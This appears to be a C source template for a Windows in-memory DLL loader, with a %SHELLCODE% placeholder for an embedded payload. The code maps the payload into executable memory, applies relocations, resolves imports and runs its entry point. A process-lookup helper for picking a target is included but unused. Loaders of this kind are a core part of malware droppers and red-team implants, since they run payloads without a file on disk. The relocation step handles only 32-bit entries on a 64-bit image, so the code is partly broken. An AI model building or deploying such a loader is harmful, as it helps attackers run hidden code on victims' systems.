
#include "utils.h"

//PEB defs todo

%SHELLCODE%

// Function to find the target process ID by its name
DWORD GetProcessID(const char *procName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (lstrcmpiA(pe32.szExeFile, procName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID; // found
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    Fail("Target process not found: %s", procName);
    return 0;
}

PIMAGE_NT_HEADERS64 PE_getNtheaders(unsigned char* payload) {
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)payload;
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) Fail("Invalid DOS signature");

    PIMAGE_NT_HEADERS64 htHeaders = (PIMAGE_NT_HEADERS64)(payload + dosHdr->e_lfanew);
    if (htHeaders->Signature != IMAGE_NT_SIGNATURE) Fail("Invalid NT signature");

    return htHeaders;
}


int WinMainCRTStartup(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    // Step 1 : Get DLL's NT headers
    PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);
    Debug("PE_getNthdrs() returned %p", dll_htHeaders);

    // Step 2: Allocate memory at dll's preferred virtual address
    SIZE_T dll_vSize = dll_htHeaders->OptionalHeader.SizeOfImage;
    LPVOID dll_vAddr = (LPVOID)dll_htHeaders->OptionalHeader.ImageBase;

    Debug("DLL size %lu, base address %p", dll_vSize, dll_vAddr);


    LPVOID allocated_vAddr = VirtualAllocEx(CUR_PROC, dll_vAddr, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocated_vAddr) {
        Debug("Preferred address allocation failed. Allocating at arbitrary address...");
        allocated_vAddr = VirtualAllocEx(CUR_PROC, NULL, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!allocated_vAddr) Fail("Memory allocation failed");
    }
    Debug("DLL allocated at: %p", allocated_vAddr);

    // Get delta between preferred and allocated address
    DWORD_PTR delta = (DWORD_PTR)allocated_vAddr - (DWORD_PTR)dll_vAddr;
    
    
    // Step 3: Copy the DLL headers 
    if (!WriteProcessMemory((HANDLE)-1, allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders, NULL))
        Fail("WriteProcessMemory() failed");






    // Step 4: Copy the DLL sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(dll_htHeaders);
    for (size_t i = 0; i < dll_htHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionAddr = (LPVOID)((ULONG_PTR)allocated_vAddr + section[i].VirtualAddress);
        LPVOID sectionData = (LPVOID)((ULONG_PTR)payload + section[i].PointerToRawData);
        SIZE_T sectionSize = section[i].SizeOfRawData;

        Debug("Copying section %s to %p", section[i].Name, sectionAddr);
        if (!WriteProcessMemory(CUR_PROC, sectionAddr, sectionData, sectionSize, NULL))
            Fail("WriteProcessMemory() failed");
    }

    // Step 5: Handle relocation if allocated at a different address
    if (allocated_vAddr != dll_vAddr) {
        Debug("Relocation needed");

        IMAGE_DATA_DIRECTORY relocations = dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocations.Size > 0) {
            PIMAGE_BASE_RELOCATION relocationBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)allocated_vAddr + relocations.VirtualAddress);
            while (relocationBlock->VirtualAddress != 0) {
                DWORD relocationCount = (relocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD relocationEntries = (PWORD)((ULONG_PTR)relocationBlock + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < relocationCount; i++) {
                    if (relocationEntries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD_PTR* addressToPatch = (DWORD_PTR*)((ULONG_PTR)allocated_vAddr + relocationBlock->VirtualAddress + (relocationEntries[i] & 0xFFF));
                        *addressToPatch += delta;
                        Debug("Relocated address at: %p", addressToPatch);
                    }
                }

                relocationBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)relocationBlock + relocationBlock->SizeOfBlock);
            }
        }
    }

    // Step 6: Resolve imports
    if (dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        Debug("Imports needed");
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)allocated_vAddr +
            dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        char* libraryName = NULL;
        HMODULE library = NULL;

        while (importDesc->Name) {
            libraryName = (char*)((ULONG_PTR)allocated_vAddr + importDesc->Name);
            Debug("Loading library: %s", libraryName);
            library = LoadLibraryA(libraryName);
            if (!library) Fail("Failed to load module: %s", libraryName);

            PIMAGE_THUNK_DATA thunkILT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->FirstThunk);

            while (thunkILT->u1.AddressOfData) {
                FARPROC procAddress = NULL;

                if (thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    Debug("Import by ordinal: 0x%X", thunkILT->u1.Ordinal & 0xFFFF);
                    procAddress = GetProcAddress(library, (LPCSTR)(thunkILT->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)allocated_vAddr + thunkILT->u1.AddressOfData);
                    Debug("Import by name: %s", importByName->Name);
                    procAddress = GetProcAddress(library, importByName->Name);
                }

                if (!procAddress) Fail("Failed to resolve import");

                Debug("Resolved import: %p", procAddress);
                thunkIAT->u1.Function = (ULONG_PTR)procAddress;
                thunkILT++;
                thunkIAT++;
            }
            Debug("Finished processing library: %s", libraryName);
            importDesc++;
        }
    }

    // Step 7: Execute the loaded DLL (DllMain())
    DllEntryPoint DLLMain = (DllEntryPoint)((ULONG_PTR)allocated_vAddr + dll_htHeaders->OptionalHeader.AddressOfEntryPoint);
    DLLMain((HINSTANCE)allocated_vAddr, DLL_PROCESS_ATTACH, NULL);

    Debug("DLL executed successfully");

    return 0;
}